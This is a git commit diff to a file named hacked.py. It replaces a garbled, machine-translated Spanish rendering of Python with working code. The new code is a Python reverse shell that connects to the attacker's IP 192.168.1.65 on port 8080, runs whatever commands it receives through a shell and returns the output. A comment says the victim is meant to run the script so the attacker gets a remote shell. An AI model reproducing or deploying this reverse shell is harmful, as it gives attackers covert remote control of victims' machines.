a1111651003342ceeea68532388b5f24d774919a
Supremo-N9 <125316216+Supremo-N9@users.noreply.github.com>
2023-02-14 22:31:13 -0600

    Update hacked.py

--- hacked.py
+++ hacked.py
@@ -1,17 +1,16 @@
-## Esto será el script que tiene que ejecutar la víctima para enviarle al atacante la shell reversa:
+import socket
+import subprocess
 
- enchufe de importación
- subproceso de importación
+client = socket.socket()
 
-cliente = enchufe . enchufe ()
-prueba :
-    cliente _ connect (( '192.168.1.65' , 8080 )) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará a la víctima.
-    cliente _ enviar ( "1" . codificar ( "ascii" ))
+try:
+    client.connect(('192.168.1.65', 8080)) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará a la víctima.
+    client.send("1".encode("ascii"))
 
-    mientras que  es cierto :
-        comandoBytes = cliente . recibo ( 1024 )
-        comandoCodificado = comandoBytes . decodificar ( "ascii" )
-        comando = subproceso . Popen ( comandoCodificado , shell = True , stdout = subproceso . PIPE , stderr = subproceso . PIPE )
-        cliente _ enviar ( comando . stdout . leer ())
-excepto :
-    aprobar
+    while True:
+        comandoBytes = client.recv(1024)
+        comandoCodificado = comandoBytes.decode("ascii")
+        comando = subprocess.Popen(comandoCodificado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        client.send(comando.stdout.read())
+except:
+    pass
